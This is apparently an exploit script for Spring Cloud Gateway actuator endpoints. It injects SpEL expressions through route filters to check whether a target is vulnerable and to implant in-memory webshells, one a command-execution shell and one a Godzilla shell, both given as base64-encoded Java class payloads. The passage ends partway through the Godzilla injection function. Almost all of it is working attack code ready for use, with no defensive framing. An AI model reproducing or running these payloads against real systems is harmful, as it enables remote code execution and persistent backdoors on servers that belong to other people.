import random
import optparse
import requests
import re

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Content-Type': 'application/json'
}
path1 = '/actuator/gateway/routes'
path2 = '/actuator/gateway/refresh'

randomstr = ''.join(random.sample('1234567890abcdef',16))
checkstr = "'"+randomstr+"'"
springmemb64 = "yv66vgAAADQAgAoABQBACgAFAEEIACgHAEIHAEMHAEQHAEUKAAQARgoABgBHBwBICAAqBwBJCgAHAEoLAEsATAoACgBACgAGAE0IAE4HAE8IAFAHAFEKAFIAUwoAUgBUCgBVAFYKABQAVwgAWAoAFABZCgAUAFoHAFsJAFwAXQoAHABeAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABlMU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW07AQADcnVuAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABVyZWdpc3RlckhhbmRsZXJNZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAAmVjAQAScmVxdWVzdE1hcHBpbmdJbmZvAQBDTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEAA21zZwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAANvYmoBABJMamF2YS9sYW5nL09iamVjdDsBAARwYXRoAQANU3RhY2tNYXBUYWJsZQcATwcASQEAPShMamF2YS9sYW5nL1N0cmluZzspTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eTsBAANjbWQBAApleGVjUmVzdWx0AQAKRXhjZXB0aW9ucwcAXwEAIlJ1bnRpbWVWaXNpYmxlUGFyYW1ldGVyQW5ub3RhdGlvbnMBADVMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RCb2R5OwEAClNvdXJjZUZpbGUBABxTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbS5qYXZhDAAfACAMAGAAYQEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwwAYgBjDABkAGUBABdTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbQEAEGphdmEvbGFuZy9TdHJpbmcMAGYAaQcAagwAawBsDABtAG4BAAJvawEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAVlcnJvcgEAEWphdmEvdXRpbC9TY2FubmVyBwBvDABwAHEMAHIAcwcAdAwAdQB2DAAfAHcBAAJcQQwAeAB5DAB6AHsBACdvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHkHAHwMAH0AfgwAHwB/AQATamF2YS9pby9JT0V4Y2VwdGlvbgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAFcGF0aHMBAAdCdWlsZGVyAQAMSW5uZXJDbGFzc2VzAQBgKFtMamF2YS9sYW5nL1N0cmluZzspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXI7AQBJb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcgEABWJ1aWxkAQBFKClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgAhAAoABQAAAAAAAwABAB8AIAABACEAAAAvAAEAAQAAAAUqtwABsQAAAAIAIgAAAAYAAQAAAAwAIwAAAAwAAQAAAAUAJAAlAAAACQAmACcAAQAhAAABIAAHAAYAAABwKrYAAhIDBr0ABFkDEgVTWQQSBlNZBRIHU7YACE4tBLYACRIKEgsEvQAEWQMSDFO2AAg6BAS9AAxZAytTuAANuQAOAQA6BS0qBr0ABVkDuwAKWbcAD1NZBBkEU1kFGQVTtgAQVxIRTacAB04SE00ssAABAAAAZwBqABIAAwAiAAAAKgAKAAAAEAAdABEAIgASADQAEwBGABQAZAAVAGcAGABqABYAawAXAG4AGQAjAAAAUgAIAB0ASgAoACkAAwA0ADMAKgApAAQARgAhACsALAAFAGcAAwAtAC4AAgBrAAMALwAwAAMAAABwADEAMgAAAAAAcAAzAC4AAQBuAAIALQAuAAIANAAAAA4AAvcAagcANfwAAwcANgABACoANwADACEAAABoAAQAAwAAACa7ABRZuAAVK7YAFrYAF7cAGBIZtgAatgAbTbsAHFkssgAdtwAesAAAAAIAIgAAAAoAAgAAAB0AGgAeACMAAAAgAAMAAAAmACQAJQAAAAAAJgA4AC4AAQAaAAwAOQAuAAIAOgAAAAQAAQA7ADwAAAAHAQABAD0AAAACAD4AAAACAD8AaAAAAAoAAQBLAAcAZwYJ"
gemb64 = "yv66vgAAADQBfwoADwC6CQAUALsKABQAvAoAFwC9CgAXAL4JABQAvwcAwAoABwC6CgAHAMEKAAcAwgkAFADDCgAPAMQIAHMHAMUHAMYHAMcHAMgKAA4AyQoAEADKBwDLCACiBwDMBwDNCgARAM4LAM8A0AoAFAC6CgAQANEIANIHANMKAB0A1AgA1QcA1gcA1woA2ADZCgDYANoKACAA2wcA3AgAgwcAhgkA3QDeCgDdAN8IAOAKAOEA4gcA4woAFwDkCgAsAOUKAOEA5goA4QDnCADoCgDpAOoKABcA6woA6QDsBwDtCgDpAO4KADUA7woANQDwCgAXAPEIAPIKAA4A8wgA9AcA9QoADgD2BwD3CAD4CAD5CgAOAPoIAPsIAPwIAP0IAP4IAP8LABYBABIAAAEGCgEHAQgHAQkJAQoBCwoASwEMCgAdAQ0LAQ4BDwoAFAEQCgAUAREJABQBEggBEwsBFAEVCgAUARYLARQBFwgBGAcBGQoAWAC6CgAPARoKAA8AwgoAWAEbCgAUARwKABcBHQoBBwEeBwEfCgBgALoBAAVzdG9yZQEAD0xqYXZhL3V0aWwvTWFwOwEACVNpZ25hdHVyZQEANUxqYXZhL3V0aWwvTWFwPExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0Oz47AQAEcGFzcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA21kNQEAAnhjAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMR01lbTsBAAhkb0luamVjdAEAXChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVcmVnaXN0ZXJIYW5kbGVyTWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAQ0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAANtc2cBAAR2YXI2AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADb2JqAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEcGF0aAEABWdwYXNzAQAEZ2tleQEADVN0YWNrTWFwVGFibGUHANMHAM0BAAtkZWZpbmVDbGFzcwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEACmNsYXNzYnl0ZXMBAAJbQgEADnVybENsYXNzTG9hZGVyAQAZTGphdmEvbmV0L1VSTENsYXNzTG9hZGVyOwEABm1ldGhvZAEACkV4Y2VwdGlvbnMBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAR2YXI0AQABcwEAAW0BAAFaBwDLBwEgAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAJicwEABXZhbHVlAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAANjbWQBAF0oTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTspTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eTsBAAxidWZmZXJTdHJlYW0BAAR2YXIzAQAFcGRhdGEBADJMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmVyL1NlcnZlcldlYkV4Y2hhbmdlOwEAGVJ1bnRpbWVWaXNpYmxlQW5ub3RhdGlvbnMBADVMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1Bvc3RNYXBwaW5nOwEABC9jbWQBAAxsYW1iZGEkY21kJDABAEcoTG9yZy9zcHJpbmdmcmFtZXdvcmsvdXRpbC9NdWx0aVZhbHVlTWFwOylMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQACaWQBAARkYXRhAQAEdmFyNwEAKExvcmcvc3ByaW5nZnJhbWV3b3JrL3V0aWwvTXVsdGlWYWx1ZU1hcDsBAAZyZXN1bHQBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7BwDAAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAJR01lbS5qYXZhDABqAGsMAGYAZwwAaACVDAEhASIMASMBJAwAaQBnAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMASUBJgwBJwEiDABoAGcMASgBKQEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwwBKgErDAEsAS0BAARHTWVtAQAwb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmVyL1NlcnZlcldlYkV4Y2hhbmdlAQAQamF2YS9sYW5nL1N0cmluZwwBLgExBwEyDAEzATQMATUBNgEAAm9rAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwBNwBrAQAFZXJyb3IBABdqYXZhL25ldC9VUkxDbGFzc0xvYWRlcgEADGphdmEvbmV0L1VSTAcBOAwBOQE6DAE7ATwMAGoBPQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgcBPgwBPwCcDAFAAUEBAANBRVMHASAMAUIBQwEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAUQBRQwAagFGDAFHAUgMAUkBSgEAA01ENQcBSwwBQgFMDAFNAU4MAU8BUAEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAFRAUUMAGoBUgwBJwFTDAFUASIBABBqYXZhLnV0aWwuQmFzZTY0DAFVAVYBAApnZXRFbmNvZGVyAQASW0xqYXZhL2xhbmcvQ2xhc3M7DAFXASsBABNbTGphdmEvbGFuZy9PYmplY3Q7AQAOZW5jb2RlVG9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAFYAVkBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBWgFbAQAQQm9vdHN0cmFwTWV0aG9kcw8GAVwQAV0PBwFeEACsDAFfAWAHAWEMAWIBYwEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcBZAwBZQFmDABqAWcMAWgBIgcBaQwBagFdDACfAKAMAIsAjAwAYgBjAQAHcGF5bG9hZAcBawwBbAFdDACDAIQMAW0BbgEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBbwFwDAFxAUUMAJgAmQwBIwFTDAFyAXMBABFqYXZhL3V0aWwvSGFzaE1hcAEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAVwYXRocwEAB0J1aWxkZXIBAAxJbm5lckNsYXNzZXMBAGAoW0xqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAElvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAFYnVpbGQBAEUoKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAKShbTGphdmEvbmV0L1VSTDtMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAC2dldEZvcm1EYXRhAQAfKClMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwoBdAF1AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsKABQBdgEABWFwcGx5AQAlKExHTWVtOylMamF2YS91dGlsL2Z1bmN0aW9uL0Z1bmN0aW9uOwEAG3JlYWN0b3IvY29yZS9wdWJsaXNoZXIvTW9ubwEAB2ZsYXRNYXABADwoTGphdmEvdXRpbC9mdW5jdGlvbi9GdW5jdGlvbjspTHJlYWN0b3IvY29yZS9wdWJsaXNoZXIvTW9ubzsBACNvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1cwEAAk9LAQAlTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOwEAOihMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7KVYBAApnZXRNZXNzYWdlAQAmb3JnL3NwcmluZ2ZyYW1ld29yay91dGlsL011bHRpVmFsdWVNYXABAAhnZXRGaXJzdAEADWphdmEvdXRpbC9NYXABAANnZXQBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAC3RvQnl0ZUFycmF5AQAEanVzdAEAMShMamF2YS9sYW5nL09iamVjdDspTHJlYWN0b3IvY29yZS9wdWJsaXNoZXIvTW9ubzsHAXcMAXgBewwAqwCsAQAiamF2YS9sYW5nL2ludm9rZS9MYW1iZGFNZXRhZmFjdG9yeQEAC21ldGFmYWN0b3J5BwF9AQAGTG9va3VwAQDMKExqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMkTG9va3VwO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvaW52b2tlL01ldGhvZFR5cGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTtMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTspTGphdmEvbGFuZy9pbnZva2UvQ2FsbFNpdGU7BwF+AQAlamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cAEAHmphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcwAhABQADwAAAAQACQBiAGMAAQBkAAAAAgBlAAkAZgBnAAAACQBoAGcAAAAJAGkAZwAAAAoAAQBqAGsAAQBs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"
gpass = ''.join(random.sample('1234567890abcdefghijklmnopqrstuvwxyz',16))
gkey = ''.join(random.sample('1234567890abcdefghijklmnopqrstuvwxyz',16))

# set post data
def postdata(payload):
    data={
        "filters": [{
            "name": "SetResponseHeader",
            "args": {
                "name": randomstr,
                "value": f"#{{{payload}}}"
            }
        }],
        "uri": "http://example.com"
    }
    return data

# check if target is vulnerable
def check(url,data):
    # created
    createUrl = url.strip('/')+path1+"/"+randomstr
    r = requests.post(url=createUrl,headers=headers,json=data,verify=False,timeout=7)
    if r.status_code == 201:
        # refresh
        refreshUrl = url.strip('/')+path2
        r = requests.post(url=refreshUrl,headers=headers,verify=False,timeout=7)
        if r.status_code == 200:
            # check result
            checkUrl = url.strip('/')+path1+"/"+randomstr
            r = requests.get(url=checkUrl,headers=headers,verify=False,timeout=7)
            if randomstr in r.text:
                print("[+] "+url+" is vulnerable")
                deleteUrl = url.strip('/')+path1+"/"+randomstr
                # print("start delete route "+randomstr)
                r = requests.delete(url=deleteUrl,headers=headers,verify=False,timeout=7)
                r = requests.post(url=refreshUrl,headers=headers,verify=False,timeout=7)
                # print("delete route "+randomstr+" success")
        else:
            print("refresh fail|resp code "+r.status_code)
    else:
        print("create route fail|resp code "+r.status_code)

# inject spring cmd memshell
def spring(url,data,spath):
    # created
    createUrl = url.strip('/')+path1+"/"+randomstr
    r = requests.post(url=createUrl,headers=headers,json=data,verify=False,timeout=7)
    if r.status_code == 201:
        # refresh
        refreshUrl = url.strip('/')+path2
        r = requests.post(url=refreshUrl,headers=headers,verify=False,timeout=7)
        if r.status_code == 200:
            # check result
            checkUrl = url.strip('/')+spath
            data = "echo "+randomstr
            r = requests.post(url=checkUrl,headers=headers,data=data,verify=False,timeout=7)
            if randomstr in r.text:
                print("[+] inject spring cmd memshell success")
                print("[+] spring cmd memshell: "+url.strip('/')+spath)
                print("[----------------------------------------]")
                print("POST "+spath)
                print("")
                print("whoami")
                print("[----------------------------------------]")
                # print("start delete route "+randomstr)
                deleteUrl = url.strip('/')+path1+"/"+randomstr
                r = requests.delete(url=deleteUrl,headers=headers,verify=False,timeout=7)
                r = requests.post(url=refreshUrl,headers=headers,verify=False,timeout=7)
                # print("delete route "+randomstr+" success")
            else:
                print("payload send but can't find command result")
                print("please check by yourself")
        else:
            print("refresh fail|resp code "+r.status_code)
    else:
        print("create route fail|resp code "+r.status_code)

# inject godzilla memshell
def godzilla(url,data,gpath):
    # created
    createUrl = url.strip('/')+path1+"/"+randomstr
    r = requests.post(url=createUrl,headers=headers,json=data,verify=False,timeout=7)
    if r.status_code == 201:
        # refresh
        refreshUrl = url.strip('/')+path2
        r = requests.post(url=refreshUrl,headers=headers,verify=False,timeout=7)
        if r.status_code == 200:
            # check result
            checkUrl = url.strip('/')+gpath
            r = requests.post(url=checkUrl,headers=headers,data=data,verify=False,timeout=7)
            if "null" in r.text:
                print("[+] inject godzilla memshell success")
